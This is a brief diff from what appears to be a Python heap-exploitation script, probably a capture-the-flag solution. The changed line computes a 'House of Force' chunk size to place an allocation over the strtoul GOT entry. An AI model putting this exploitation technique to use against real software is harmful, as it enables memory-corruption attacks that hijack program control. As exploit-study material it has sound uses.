@@ -109,7 +109,7 @@ f.write("q\n")
 readuntil(f)
 
 # main_menu
-hof_size_2 = format((STRTOUL_GOT-8-(int(heap_base,16)+WILDERNESS_OFFSET))&0xffffffff,'x')
+hof_size_2 = format((STRTOUL_GOT-8-(wilderness_addr))&0xffffffff,'x')
 print "[*] allocating second HOF chunk with size "+str(hex(int(hof_size_2,16)))
 
 f.write("g\n")
